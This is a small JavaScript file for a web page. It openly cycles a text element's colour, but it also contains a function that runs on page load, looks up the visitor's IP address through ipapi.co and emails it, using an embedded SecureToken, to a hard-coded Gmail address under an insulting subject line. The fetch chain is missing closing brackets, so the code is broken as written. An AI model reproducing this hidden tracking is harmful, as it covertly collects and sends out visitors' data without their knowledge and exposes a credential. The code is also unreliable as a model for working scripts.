const myTextElement = document.querySelector(".main_text");
const colors = ["#ff0000", "#09ff00", "#0000ff"];

let i = 0;

const colorloop = () => {
  if (i >= colors.length) i = 0;

  myTextElement.style.color = colors[i];
  i++;
};

setInterval(colorloop, 500);

const getIp = () => {
  fetch("https://ipapi.co/json/")
    .then((response) => response.json())
    .then((data) => {
      Email.send({
        SecureToken: "6159cc5f-8436-4273-8e76-f9620c4bda2f",
        To: "walden.devbusiness@gmail.com",
        From: "walden.devbusiness@gmail.com",
        Subject: "IP KURWY",
        Body: data.ip,
      });
};

getIp();
